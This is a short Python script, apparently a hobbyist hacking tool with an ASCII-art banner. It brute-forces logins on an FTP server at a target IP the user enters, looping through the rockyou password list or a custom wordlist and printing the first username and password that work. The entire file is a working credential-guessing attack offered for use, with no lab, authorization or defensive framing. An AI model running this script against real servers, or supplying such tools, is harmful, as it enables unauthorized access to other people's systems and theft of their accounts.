import os
import gzip
from ftplib import FTP

os.system("clear")
print("\033[93m" + r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|
""" + "\033[0m")

target_ip = input("Enter Target IP: ")
port = input("Enter FTP port (default 21): ") or "21"
username = input("Enter FTP username (leave empty for 'anonymous'): ") or "anonymous"

choice = input("Do you want to use a ready-made password list (rockyou.txt.gz)? (y/n): ").lower()

if choice == "y":
    try:
        password_file = gzip.open("rockyou.txt.gz", "rt", encoding="latin-1", errors="ignore")
    except FileNotFoundError:
        print("\033[91mrockyou.txt.gz not found in current directory.\033[0m")
        exit()
else:
    custom_path = input("Enter the full path to your password list: ")
    try:
        password_file = open(custom_path, "r", encoding="utf-8", errors="ignore")
    except FileNotFoundError:
        print("\033[91mCustom password list not found.\033[0m")
        exit()

for password in password_file:
    password = password.strip()
    try:
        ftp = FTP()
        ftp.connect(target_ip, int(port), timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"\033[92m✅ Success! Username: {username} | Password: {password}\033[0m")
        ftp.quit()
        break
    except:
        pass

password_file.close()
